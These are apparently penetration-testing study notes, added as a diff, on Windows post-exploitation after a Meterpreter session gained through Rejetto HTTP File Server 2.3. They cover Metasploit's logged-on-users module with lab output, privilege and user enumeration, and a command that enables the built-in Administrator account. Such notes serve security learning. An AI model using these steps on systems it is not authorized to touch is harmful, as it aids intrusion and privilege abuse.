@@ -548,6 +548,9 @@ Hotfixes
 Hotfixes are indeed updates specifically designed to fix bugs or address critical issues in software
 C:> systeminfo
 
+Hotfix(s):                 208 Hotfix(s) Installed.
+                           [01]: KB2894856
+
 You can see the hotfixes by writing that command
 
 
@@ -555,3 +558,67 @@ C:> wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 That command can be used to enumerate a list of installed updates in addition to the HotFix URL?
 __________________________________________________________________________________________________________________________________
+Enumerate Logged_on User with meterpreter
+----------------------------------------
+Initial exploit with rejetto (HTTPFILE SERVER 2.3)
+send meterpreter session to the background
+
+metrepter > background
+
+msf5 > search logged_on (logged_on User)
+     > use 0
+     > show sessions
+     > set session 1 (use the previous session)
+     > run
+
+Current Logged Users
+====================
+
+ SID                                            User
+ ---                                            ----
+ S-1-5-21-2563855374-3215282501-1490390052-500  WIN-OMCNBKR66MN\Administrator
+
+[+] Results saved in: /root/.msf4/loot/20240603122156_default_10.0.19.250_host.users.activ_004353.txt
+Recently Logged Users
+=====================
+
+ SID                                            Profile Path
+ ---                                            ------------
+ S-1-5-18                                       %systemroot%\system32\config\systemprofile
+ S-1-5-19                                       C:\Windows\ServiceProfiles\LocalService
+ S-1-5-20                                       C:\Windows\ServiceProfiles\NetworkService
+ S-1-5-21-2563855374-3215282501-1490390052-500  C:\Users\Administrator
+__________________________________________________________________________________________________________________________________
+To see privileges
+-------------------
+meterpreter > getpriv
+C:\> whoami /priv
+
+To show logging time
+--------------------
+C:\>query user
+
+query user
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>administrator         console             1  Active      none   6/3/2024 6:49 AM
+
+To know administrator account detail
+------------------------------------
+C:\> net user administrator
+__________________________________________________________________________________________________________________________________
+The Windows Administrator account is disabled by default unless it is explicitly enabled. (yes, true)
+------------------------------------------------------------------------------------------
+To show the administrator account is disabled or enabled
+
+C:\> net user administrator (if it shows info, that means account is enabled)
+
+To enable administrator account 
+--------------------------------
+C:\> net user administrator /active:yes
+__________________________________________________________________________________________________________________________________
+
+
+
+
+
+
